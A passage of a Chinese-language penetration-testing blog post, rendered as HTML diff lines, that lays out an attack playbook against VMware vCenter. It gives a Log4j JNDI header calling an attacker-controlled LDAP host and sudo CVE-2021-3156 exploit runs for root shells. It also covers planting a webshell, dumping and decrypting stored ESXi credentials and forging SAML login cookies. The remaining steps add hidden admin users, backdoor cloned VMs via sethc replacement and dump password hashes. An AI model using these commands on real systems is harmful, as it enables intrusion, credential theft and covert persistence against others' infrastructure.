class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Dest: document</span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Mode: navigate</span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Site: none</span><br><span class="line"><span class="attribute">Sec</span>-Fetch-User: ?<span class="number">1</span></span><br><span class="line"><span class="attribute">Te</span>: trailers</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用执行命令</li>
+</ul>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VPS启用JNDIExploit</span></span><br><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JNDIExploit-1.4-SNAPSHOT.jar </span>-i VPSIP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求包</span></span><br><span class="line">X-Forwarded-For: $&#123;<span class="keyword">jndi:ldap://VPSIP:1389/TomcatBypass/TomcatEcho&#125;</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword"># </span>在head头里面放置cmd参数</span><br><span class="line"><span class="symbol">cmd:</span> whoami</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>完全不出网的话就在内网搭建LDAP实现</p>
+</blockquote>
+<h2 id="后渗透利用"><a href="#后渗透利用" class="headerlink" title="后渗透利用"></a>后渗透利用</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="CVE-2021-3156"><a href="#CVE-2021-3156" class="headerlink" title="CVE-2021-3156"></a>CVE-2021-3156</h4><blockquote>
+<p>Linux sudo权限提升漏洞</p>
+</blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/worawit/CVE-2021-3156/blob/main/exploit_defaults_mailer.py">exploit_defaults_mailer.py</a></li>
+</ul>
+<blockquote>
+<p>需要在交互的情景使用，使用后会在/tmp/目录下生成一个二进制文件，执行文件即可获得一个root的shell</p>
+</blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python exploit_defaults_mailer.py</span><br><span class="line"><span class="regexp">/tmp/</span>sshell</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/worawit/CVE-2021-3156/blob/main/exploit_userspec.py">exploit_userspec.py</a></li>
+</ul>
+<blockquote>
+<p>往指定地点写入文件内容，这个脚本会往/etc/passwd目录下写入一个gg用户密码也是gg，其实就是一个任意文件写入的利用。</p>
+</blockquote>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行以后没有任何返回即失败(有时需要多运行几次)</span></span><br><span class="line"><span class="attribute">python</span> exploit_userspec.py</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>也可以修改脚本内容实现创建一个root权限的webshell</p>
+<p><code>PASSWD_PATH=b&#39;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/1.jsp&#39;</code></p>
+<p><code>APPEND_CONTENT=b&#39;webshell内容&#39;</code></p>
+</blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span><span class="number">172.16</span>.xx.xx<span class="regexp">/idm/</span>..;/<span class="number">1</span>.jsp</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2021-22015"><a href="#CVE-2021-22015" class="headerlink" title="CVE-2021-22015"></a>CVE-2021-22015</h4><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><blockquote>
+<p>vcenter默认数据库文件在windwos和linux下都叫vcdb.properties，配置文件中有数据库的明文账号密码</p>
+</blockquote>
+<ul>
+<li>Linux默认路径</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/etc/</span>vmware-vpx/vcdb.properties</span><br><span class="line"><span class="regexp">/etc/</span>vmware<span class="regexp">/service-state/</span>vpxd/vcdb.properties</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Windows默认路径</li>
+</ul>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="tag">\<span class="name">ProgramData</span></span><span class="tag">\<span class="name">VMware</span></span><span class="tag">\<span class="name">vCenterServer</span></span><span class="tag">\<span class="name">cfg</span></span><span class="tag">\<span class="name">vmware</span></span>-vpx<span class="tag">\<span class="name">vcdb</span></span>.properties</span><br><span class="line">C:<span class="tag">\<span class="name">ProgramData</span></span><span class="tag">\<span class="name">VMware</span></span><span class="tag">\<span class="name">VMware</span></span> VirtualCenter<span class="tag">\<span class="name">vcdb</span></span>.properties</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>利用数据库账号密码登录数据库，默认是postgresql数据库，默认只能在vCenter服务器本地登录</p>
+</blockquote>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">psql -h localhost -d VCDB -U vc</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查询虚拟主机信息</li>
+</ul>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">VCDB</span>=&gt; SELECT id,datacenter_id,file_name,guest_os,ip_address,config FROM vc.vpx_vm<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>查询cVenter中配置的ESXI账号密码</li>
+</ul>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该密码可以用来登陆ESXI服务器，但是还需要先解密明文密码</span></span><br><span class="line"><span class="attr">VCDB</span>=&gt; SELECT name,port,username,password,password_last_upd_dt,product_fullname FROM vc.vpxv_hosts<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>通过<a target="_blank" rel="noopener" href="https://github.com/shmilylty/vhost_password_decrypt/blob/main/decrypt.py">decrypt.py</a>解密symkey.dat文件获取明文密码</li>
+</ul>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># symkey.dat文件位置</span><br><span class="line">Windows: C:<span class="tag">\<span class="name">ProgramData</span></span><span class="tag">\<span class="name">VMware</span></span><span class="tag">\<span class="name">vCenterServer</span></span><span class="tag">\<span class="name">cfg</span></span><span class="tag">\<span class="name">vmware</span></span>-vpx<span class="tag">\<span class="name">ssl</span></span><span class="tag">\<span class="name">symkey</span></span>.dat</span><br><span class="line">Linux: /etc/vmware-vpx/ssl/symkey.dat</span><br><span class="line"></span><br><span class="line"># 解密明文密码,密码放到password.enc</span><br><span class="line">python3 decrypt.py symkey.dat password.enc password.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>到这一步已经可以登陆ESXI服务器的SSH了，但是ESXI服务器默认是<code>没有开启SSH服务</code>!!</p>
+<p>但是这个密码也同样可以登录这个ESXI服务器的<code>Web后台</code>，在后台开启SSH服务</p>
+<p><code>左上角导航</code> -&gt; <code>主机</code> -&gt; <code>操作</code> -&gt; <code>服务</code> -&gt; <code>启用</code> -&gt; <code>启用Secure Shell(SSH)</code></p>
+</blockquote>
+<h3 id="登陆后台"><a href="#登陆后台" class="headerlink" title="登陆后台"></a>登陆后台</h3><blockquote>
+<p>vCenter Web 管控系统后台才是重点，单纯的webshell价值不大.</p>
+</blockquote>
+<h4 id="Cookie登陆"><a href="#Cookie登陆" class="headerlink" title="Cookie登陆"></a>Cookie登陆</h4><blockquote>
+<p>通过解密数据库登录获取cookie，再用cookie登录web控制台</p>
+</blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/horizon3ai/vcenter_saml_login">vcenter_saml_login</a></li>
+</ul>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#Linux</span></span><br><span class="line">/storage/db/vmware-vmdir/<span class="class"><span class="keyword">data</span>.mdb</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#windows</span></span><br><span class="line"><span class="type">C</span>:\<span class="type">ProgramData</span>\<span class="type">VMware</span>\vCenterServer\<span class="class"><span class="keyword">data</span>\vmdird\<span class="keyword">data</span>.mdb</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 生成<span class="selector-tag">Cookie</span></span><br><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">vcenter_saml_login</span><span class="selector-class">.py</span> <span class="selector-tag">-p</span> <span class="selector-tag">data</span><span class="selector-class">.mdb</span> <span class="selector-tag">-t</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.121</span> </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>使用生成的<code>Cookie替换</code>之后访问<code>https://192.168.1.121/ui</code></p>
+</blockquote>
+<ul>
+<li><p>但是Windows的data.mdb文件一般较大，如果目标机器存在python环境的话可以用以下方法</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_ExtraCertFromMdb.py">vCenter_ExtraCertFromMdb.py</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传该脚本到目标服务器，运行该脚本会生成</span></span><br><span class="line"><span class="comment"># (idp_cert.txt trusted_cert_1.txt trusted_cert_2.txt)</span></span><br><span class="line">python vCenter_ExtraCertFromMdb.py data.mdb</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_GenerateLoginCookie.py">vCenter_GenerateLoginCookie.py</a></p>
+</li>
+</ul>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 把三个证书文件复制到本地运行脚本获取<span class="selector-tag">Cookie</span></span><br><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">vCenter_GenerateLoginCookie</span><span class="selector-class">.py</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.121192</span><span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.121</span> <span class="selector-tag">vsphere</span><span class="selector-class">.local</span> <span class="selector-tag">idp_cert</span><span class="selector-class">.txt</span> <span class="selector-tag">trusted_cert_1</span><span class="selector-class">.txt</span> <span class="selector-tag">trusted_cert_2</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="解密登陆"><a href="#解密登陆" class="headerlink" title="解密登陆"></a>解密登陆</h4><blockquote>
+<p>解密数据库加密密码实现登陆后台的效果，在前面数据库操作已经写了具体的步骤</p>
+</blockquote>
+<h4 id="LDAP添加用户"><a href="#LDAP添加用户" class="headerlink" title="LDAP添加用户"></a>LDAP添加用户</h4><blockquote>
+<p>将脚本上传到vCenter服务器进行添加管理员用户.</p>
+<p>可以自己将脚本修改，将LDAP的凭证信息和添加的账号信息写到脚本中，避免input时的编码问题</p>
+</blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenterLDAP_Manage.py">vCenterLDAP_Manage.py</a></li>
+</ul>
+<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">## 照着提示一步步填写即可</span></span><br><span class="line"><span class="meta"># 增加用户</span></span><br><span class="line">python vCenterLDAP_Manage.py adduser</span><br><span class="line"></span><br><span class="line"><span class="meta"># 把用户加入管理员组</span></span><br><span class="line">python vCenterLDAP_Manage.py addadmin</span><br><span class="line"></span><br><span class="line"><span class="meta"># 接下来就可以使用添加的账号密码进行登录</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="重置密码"><a href="#重置密码" class="headerlink" title="重置密码"></a>重置密码</h4><blockquote>
+<p><code>不推荐</code></p>
+<p>最快最暴力的方法，重置之后无法获取原来的密码，管理员发现的快.</p>
+</blockquote>
+<ul>
+<li>运行之后选择 <code>3 选项</code>，然后输入默<code>administrator@vsphere.local</code>[管理员权限运行]</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux </span></span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/vmware-vmdir/</span>bin/vdcadmintool </span><br><span class="line"></span><br><span class="line"><span class="comment">#Windows </span></span><br><span class="line">C:\Program Files\Vmware\vCenter Server\vmdird\vdcadmintool.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="进入系统"><a href="#进入系统" class="headerlink" title="进入系统"></a>进入系统</h3><blockquote>
+<p>很多时候在获取到VCenter或者ESXI服务器权限或Web后台登陆权限以后，目标处于锁屏情况，并且需要输入密码，所以需要抓去目标机器的密码或者Hash</p>
+</blockquote>
+<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><blockquote>
+<p>Windows可以尝试进入系统获取密码或者hash，以及敏感文件.</p>
+</blockquote>
+<h5 id="KonBoot引导"><a href="#KonBoot引导" class="headerlink" title="KonBoot引导"></a>KonBoot引导</h5><blockquote>
+<p> 因为该方法需要重启机器，因此先对目标主机进行克隆，此后的所有操作对克隆主机进行操作</p>
+</blockquote>
+<ul>
+<li><code>Datacenter</code> &gt; <code>选择机器</code> &gt;  <code>Win7</code> &gt; <code>摘要</code> &gt; <code>操作</code> &gt; <code>克隆到虚拟机</code> &gt; <code>fakeWin7</code></li>
+</ul>
+<blockquote>
+<p>上传kon-bootCD-2.7.iso到VCenter上</p>
+</blockquote>
+<ul>
+<li><p><code>选择Datacenter</code>  &gt; <code>文件</code> &gt; <code>上载文件</code> &gt; <code>kon-bootCD-2.7.iso</code></p>
+</li>
+<li><p><code>Datacenter</code> &gt; <code>选择机器</code> &gt;  <code>fakeWin7</code>  &gt; <code>编辑虚拟机设置</code>  &gt; <code>虚拟机硬件</code> &gt; <code>网络适配器机器取消勾选</code>(由于克隆的机器所以可能出现ip重复) &gt; <code>设置打开电源时连接kon-bootCD-2.7.iso</code></p>
+</li>
+<li><p><code>Datacenter</code> &gt; <code>选择机器</code> &gt;  <code>fakeWin7</code>  &gt; <code>编辑虚拟机设置</code>  &gt; <code>虚拟机选项</code> &gt; <code>勾选强制执行BIOS设置</code>(如果目标是EFI启动的话，则是勾选强制执行EFI设置)</p>
+</li>
+<li><p><code>重启fakeWin7</code> &gt; <code>进入bios</code> &gt; <code>选择Boot</code> &gt; <code>CD-ROM Drive设置为第一位</code> &gt; <code>F10保存退出</code></p>
+</li>
+<li><p>重启成功就可以直接<code>空密码</code>或者使用<code>shift后门</code>弹出cmd</p>
+</li>
+<li><p>通过reg的save选项将注册表中的SAM、System导出，接着使用mimikatz读取其中保存的账号hash。</p>
+</li>
+</ul>
+<h5 id="PE免密"><a href="#PE免密" class="headerlink" title="PE免密"></a>PE免密</h5><blockquote>
+<p>使用PE文件上传到Vcenter中，使用PE免密进入系统，但是如果直接操作目标需要重启系统，可克隆目标后在克隆机器上使用PE</p>
+</blockquote>
+<ul>
+<li><code>Datacenter</code> &gt; <code>选择机器</code> &gt;  <code>Win7</code> &gt; <code>摘要</code> &gt; <code>操作</code> &gt; <code>克隆到虚拟机</code> &gt; <code>fakeWin7</code></li>
+<li><code>选择Datacenter</code>  &gt; <code>文件</code> &gt; <code>上载文件</code> &gt; <code>pe.iso</code></li>
+<li><code>Datacenter</code> &gt; <code>选择机器</code> &gt;  <code>fakeWin7</code>  &gt; <code>编辑虚拟机设置</code>  &gt; <code>虚拟机硬件</code> &gt; <code>网络适配器机器取消勾选</code>(由于克隆的机器所以可能出现ip重复) &gt; <code>设置打开电源时连接pe.iso</code></li>
+<li><code>重启fakeWin7</code> &gt; <code>进入bios</code> &gt; <code>选择Boot</code> &gt; <code>CD-ROM Drive设置为第一位</code> &gt; <code>F10保存退出</code></li>
+<li><code>进入PE</code> &gt; <code>windows/system32中将sethc.exe改为sethc.bak</code> &gt; <code>复制cmd.exe为sethc.exe</code> &gt; <code>取消强制进入bios</code> &gt; <code>CD-ROM Drive改为最初的样子重启</code></li>
+<li><code>在登陆界面连续按五次shift</code> &gt; <code>弹出cmd</code>（当然也可以换成马儿，但是网络适配器要开启）</li>
+</ul>
+<h5 id="快照读取"><a href="#快照读取" class="headerlink" title="快照读取"></a>快照读取</h5><blockquote>
+<p>通过<a target="_blank" rel="noopener" href="https://www.volatilityfoundation.org/releases">volatility</a>读取生成的快照来获取密码和hash（profile的值可以参考<a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility/wiki/2.6-Win-Profiles">WIKI</a>）</p>
+</blockquote>
+<ul>
+<li><code>Datacenter</code> &gt; <code>选择机器</code> &gt;  <code>Win7</code> &gt; <code>右键</code> &gt; <code>快照</code> &gt; <code>生成快照</code> &gt; <code>在数据存储中找到目标快照的.vmem文件或者.vmsn文件</code></li>
+</ul>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\\读取明文密码</span><br><span class="line">volatility_2.<span class="number">6_</span>win64_standalone.exe -f win7-zhanglili-<span class="module-access"><span class="module"><span class="identifier">Snapshot1</span>.</span></span>vmem --profile=Win7SP1x64_23418 lsadump</span><br><span class="line"></span><br><span class="line">\\读取hash</span><br><span class="line">volatility_2.<span class="number">6_</span>win64_standalone.exe -f win7-zhanglili-<span class="module-access"><span class="module"><span class="identifier">Snapshot1</span>.</span></span>vmem --profile=Win7SP1x64_23418 hashdump</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：<code>虚拟机内存有多大，快照就有多大</code></p>
+<p>如果快照过大无法短时间内下载完成可以通过ssh连上ESXI服务器，然后操作快照</p>
+</blockquote>
+<h5 id="挂载VMDK读取"><a href="#挂载VMDK读取" class="headerlink" title="挂载VMDK读取"></a>挂载VMDK读取</h5><blockquote>
+<p>主要是通过Win7克隆一个虚拟机FakeWin7，将该FakeWin7关机(开机状态无法读取它的vmdk文件)，然后新建一个虚拟机挂载FakeWin7的vmdk文件，导出机器的：</p>
+<ul>
+<li>C:\Windows\System32\config\SYSTEM</li>
+<li>C:\Windows\System32\config\SAM</li>
+<li>C:\Windows\NTDS\NTDS.dit（DC才有）</li>
+</ul>
+</blockquote>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><blockquote>
+<p>Linux系统不能直接从内存中获取密码，但是可以通过将机器克隆后使用<code>单用户模式</code>进入系统查看hash或者翻找敏感文件.</p>
+</blockquote>
+<h4 id="单用户模式"><a href="#单用户模式" class="headerlink" title="单用户模式"></a>单用户模式</h4><ul>
+<li><code>Datacenter</code> &gt; <code>选择机器</code> &gt;  <code>Linux</code> &gt; <code>摘要</code> &gt; <code>操作</code> &gt; <code>克隆到虚拟机</code> &gt; <code>FakeLinux</code></li>
+<li><code>FakeLinux</code> &gt; 开机按”ESC”键，进入系统引导界面，及时按上下方向键”↑ ↓”中断倒计时</li>
+<li>按”<code>e</code>“键，进入内核编辑界面</li>
+<li>找到<code>linux16(或者linux) 开头行</code>，<code>删除ro</code>，并且在ro处添加 <code>rw init=/sysroot/bin/sh</code></li>
+<li>按<code> ctrl + x</code> 进行系统重新引导</li>
+<li><code>mount -o remount,rw /sysroot/</code></li>
+<li><code>chroot /sysroot</code></li>
+<li><code>passwd root</code></li>
+<li><code>touch /.autorelabel</code></li>
+<li><code>reboot</code></li>
+<li>使用刚刚设置的新密码进行登录</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/post/WmwarevCenter/" class="leancloud-visitors view" data-flag-title="vCenter利用">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/post/JumpServer/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/post/内网横向/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-01-02 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#VMware-vCenter"><span class="toc-article-text">VMware vCenter</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%83%8C%E6%99%AF%E4%BB%8B%E7%BB%8D"><span class="toc-article-text">背景介绍</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%9C%A8%E7%BA%BF%E6%8C%87%E7%BA%B9"><span class="toc-article-text">在线指纹</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%89%88%E6%9C%AC%E6%8E%A2%E6%B5%8B"><span class="toc-article-text">版本探测</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SDK-XML"><span class="toc-article-text">SDK XML</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%B0%83%E7%94%A8SOAP-API"><span class="toc-article-text">调用SOAP API</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-article-text">漏洞利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-article-text">综合利用工具</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-article-text">任意文件读取</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2021-21972"><span class="toc-article-text">CVE-2021-21972</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2021-21985"><span class="toc-article-text">CVE-2021-21985</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#Tomcat-RMI-%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-article-text">Tomcat RMI 出网利用链</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-article-text">不出网利用</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2021-22005"><span class="toc-article-text">CVE-2021-22005</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Log4j"><span class="toc-article-text">Log4j</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8"><span class="toc-article-text">后渗透利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-article-text">提权</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#CVE-2021-3156"><span class="toc-article-text">CVE-2021-3156</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#CVE-2021-22015"><span class="toc-article-text">CVE-2021-22015</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"><span class="toc-article-text">数据库操作</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0"><span class="toc-article-text">登陆后台</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Cookie%E7%99%BB%E9%99%86"><span class="toc-article-text">Cookie登陆</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%A7%A3%E5%AF%86%E7%99%BB%E9%99%86"><span class="toc-article-text">解密登陆</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#LDAP%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="toc-article-text">LDAP添加用户</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81"><span class="toc-article-text">重置密码</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BF%9B%E5%85%A5%E7%B3%BB%E7%BB%9F"><span class="toc-article-text">进入系统</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Windows"><span class="toc-article-text">Windows</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#KonBoot%E5%BC%95%E5%AF%BC"><span class="toc-article-text">KonBoot引导</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#PE%E5%85%8D%E5%AF%86"><span class="toc-article-text">PE免密</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%BF%AB%E7%85%A7%E8%AF%BB%E5%8F%96"><span class="toc-article-text">快照读取</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%8C%82%E8%BD%BDVMDK%E8%AF%BB%E5%8F%96"><span class="toc-article-text">挂载VMDK读取</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Linux"><span class="toc-article-text">Linux</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8D%95%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F"><span class="toc-article-text">单用户模式</span></a></li></ol></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 hitman's Blog
+  
+      . wubba <a href="http://hexo.io/" target="_blank">lubba</a> dub <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank"> dub.</a>  
+</p>
+
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
